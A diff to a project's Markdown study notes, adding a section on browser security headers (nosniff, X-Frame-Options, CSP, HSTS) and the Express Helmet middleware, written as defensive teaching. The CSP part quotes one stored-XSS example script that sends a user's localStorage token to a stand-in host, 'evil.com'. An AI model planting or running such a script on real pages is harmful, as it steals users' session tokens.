@@ -1148,14 +1148,16 @@ These are **response** headers — you don't send them from Postman; the API add
 | **`Cookie`** | Session ID in cookie | ❌ not used (JWT instead) |
 | **`API-Key`** | Simple key in header | ❌ not used |
 
-#### Security response headers (Helmet — future)
+#### Security response headers (Helmet)
+
+Full explanations in [10b. Safe HTTP headers](#10b-safe-http-headers--what-helmet-actually-does).
 
 | Header | Purpose | Status |
 |--------|---------|--------|
-| **`Strict-Transport-Security`** | Force HTTPS | ❌ on deploy + Helmet |
-| **`X-Content-Type-Options`** | Prevent MIME sniffing | ❌ Helmet |
-| **`X-Frame-Options`** | Clickjacking protection | ❌ Helmet |
-| **`Content-Security-Policy`** | Control loaded resources | ❌ Helmet |
+| **`Strict-Transport-Security`** | Force HTTPS | ✅ sent — effective after deploy (ignored on `localhost`) |
+| **`X-Content-Type-Options`** | Prevent MIME sniffing | ✅ `nosniff` |
+| **`X-Frame-Options`** | Clickjacking protection | ✅ `SAMEORIGIN` |
+| **`Content-Security-Policy`** | Control loaded resources | ✅ Helmet default |
 
 #### Custom / tracing (future)
 
@@ -1203,7 +1205,152 @@ Browser adds `Origin` automatically. You add `Content-Type` and `Authorization`.
 
 **This project needs two request headers for most work: `Content-Type: application/json` (when sending a body) and `Authorization: Bearer <token>` (for `/tasks`). CORS response headers are handled by your server for browser clients.**
 
-See also: [`readme.md`](readme.md) HTTP headers section, [`authflow.md`](authflow.md) for JWT in `Authorization`.
+See also: [`readme.md`](readme.md) HTTP headers section, [`authflow.md`](authflow.md) for JWT in `Authorization`, [10b. Safe HTTP headers](#10b-safe-http-headers--what-helmet-actually-does) for security headers.
+
+---
+
+## 10b. Safe HTTP headers — what Helmet actually does
+
+**Status:** ✅ `app.use(helmet())` — first middleware in `app.js`
+
+### Q: What makes a header a "safe" / security header?
+
+The headers in section 10 carry **data** (`Content-Type`, `Authorization`). Security headers carry **instructions to the browser** — "when you handle this response, refuse to do these dangerous things."
+
+| | Normal headers | Security headers |
+|---|----------------|------------------|
+| Who reads them | Your code (`req.headers`) / the client app | **The browser** |
+| Purpose | Describe the request/response | Restrict what the browser is allowed to do |
+| Who enforces | You | The browser |
+
+**Key point:** Postman *shows* response headers (response pane → **Headers** tab) but **ignores** them — it is not a browser. That's why security headers look like they "do nothing" when testing in Postman.
+
+---
+
+### The four to know
+
+#### 1. `X-Content-Type-Options: nosniff` — stop MIME sniffing
+
+Browsers used to **guess** a response's real type instead of trusting `Content-Type` — sniff the bytes, decide "this looks like JavaScript", and run it. The guess is the vulnerability.
+
+```
+X-Content-Type-Options: nosniff
+```
+
+Now something served as `application/json` can never be reinterpreted as a script.
+
+#### 2. `X-Frame-Options: DENY` — stop clickjacking
+
+The attack:
+
+```
+evil-site.com
+┌──────────────────────────────────┐
+│  [ Click to claim your prize ]   │  ← attacker's visible button
+│                                  │
+│  <iframe src="yourapp.com">      │  ← your app, invisible (opacity 0)
+│     [ Delete all tasks ]         │  ← sits exactly under the button
+└──────────────────────────────────┘
+```
+
+You are already logged in, so the iframe is authenticated. Your click lands on the button underneath and the request goes out **with your real credentials**.
+
+**Why existing defenses don't help:** valid JWT, real user, well-formed request, validation passes. Nothing is malformed — the user was tricked about *what they clicked*.
+
+```
+X-Frame-Options: DENY          ← no framing at all
+X-Frame-Options: SAMEORIGIN    ← only my own domain may frame me
+```
+
+#### 3. `Content-Security-Policy` — stop injected scripts from running
+
+If a stored comment contains `<script>fetch('evil.com?token=' + localStorage.token)</script>` and the frontend renders it, the browser runs it with full access to the page — localStorage, cookies, your API. That's XSS.
+
+Escaping output is the first layer, but one missed spot is a breach. CSP is the second layer: a whitelist of **where resources may come from**.
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+An injected inline `<script>` has no source URL, so it isn't "from `'self'`" → the browser refuses to execute it and logs a CSP violation.
+
+**Why people disable it:** it blocks inline scripts/styles by default, which many libraries, analytics snippets and CSS-in-JS tools rely on. Fixing that properly means per-source allowances or nonces.
+
+**For a JSON API:** harmless — no HTML to execute. It becomes real work when Next.js serves pages. Note CSP protects the page that *renders* data, so the header that matters for XSS is the **frontend's**, not the API's.
+
+#### 4. `Strict-Transport-Security` — stop HTTPS downgrade
+
+The gap is the **first** request. Type `yourapp.com` (no protocol) → browser tries `http://` → your server redirects to HTTPS. That first request went out in plaintext, and someone on the same WiFi can answer it with a fake copy of your site (SSL stripping).
+
+```
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+```
+
+Seen once, the browser remembers for a year: **never** contact this domain over HTTP again — the redirect now happens inside the browser, before any packet leaves.
+
+**Two catches:**
+- Only helps *after* the first successful HTTPS visit (browser preload lists exist for that gap).
+- `max-age` is a commitment you can't undo — if your certificate later expires, browsers refuse to connect and you can't reach them over HTTP to fix it. Start with a small `max-age`, raise it when confident.
+
+**Does nothing on `localhost`** over HTTP — browsers ignore it locally. Matters only after deploy with real TLS.
+
+---
+
+### Q: Hand-roll them or use Helmet?
+
+**Use Helmet.** This is the opposite of the input-validation decision (hand-rolled, see `controllers/task.js`):
+
+| | Input validation | Security headers |
+|---|------------------|------------------|
+| The rules are | **My** business logic (title 3–100, tags ≤ 20) | Standardised, identical for every app |
+| Changes when | My product changes | Browsers deprecate things |
+| Verdict | ✅ hand-rolled — writing it taught me the domain | ✅ library — maintenance with no upside |
+
+Example of that maintenance: `X-XSS-Protection` used to be recommended, is now considered harmful, and Helmet dropped it.
+
+**Worth doing once for learning:** set the four headers by hand with `res.set()`, look at the response **Headers** tab in Postman, then replace with `app.use(helmet())` and compare — roughly a dozen headers instead of four. That's the concrete answer to "what does this library do for me."
+
+```js
+app.use(helmet());
+```
+
+**What this project actually sends** (first middleware in `app.js`, so 404s and errors carry them too):
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; ...
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-DNS-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-XSS-Protection: 0
+```
+
+Two of those are worth a second look:
+
+| Header | Why it looks odd |
+|--------|------------------|
+| **`X-XSS-Protection: 0`** | Deliberately **disabling** the old browser XSS filter — it was itself exploitable, so the modern advice is off + rely on CSP |
+| **`X-Frame-Options: SAMEORIGIN`** | Helmet's default is the looser one; `DENY` needs `frameguard: { action: 'deny' }` if the API should never be framed at all |
+
+**Helmet does not break CORS.** `Cross-Origin-Resource-Policy: same-origin` governs *subresource* loading (images, scripts), not `fetch`/XHR — those are still controlled by your CORS config, which runs right after.
+
+**Free win regardless:** Express advertises itself with `X-Powered-By: Express`, telling an attacker what to target. Helmet removes it; without Helmet:
+
+```js
+app.disable('x-powered-by');
+```
+
+---
+
+### One-line summary
+
+**`nosniff` stops type guessing, `X-Frame-Options` stops clickjacking, CSP stops injected scripts from executing, HSTS stops downgrade attacks — and Helmet sets that whole family with sensible defaults in one line.**
 
 ---
 
